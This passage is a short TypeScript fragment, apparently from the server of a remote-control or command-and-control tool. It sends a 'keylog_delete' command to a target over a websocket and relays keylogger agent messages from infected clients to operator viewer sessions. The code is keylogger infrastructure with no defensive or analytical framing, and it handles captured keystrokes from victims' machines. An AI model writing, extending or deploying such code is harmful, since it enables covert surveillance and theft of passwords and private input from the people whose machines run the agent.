      target.ws.send(encodeMessage({ type: "command", commandType: "keylog_delete", id: commandId, payload: { filename } } as any));
      metrics.recordCommand("keylog_delete");
      break;
    }
    default:
      break;
  }
}

export function handleKeyloggerMessage(clientId: string, payload: any) {
  const relayPayload = normalizeKeyloggerAgentMessage(payload);
  if (!relayPayload) return;
  for (const session of sessionManager.getKeyloggerSessionsByClient(clientId)) {
    safeSendViewer(session.viewer, relayPayload, "keylogger");
  }
}
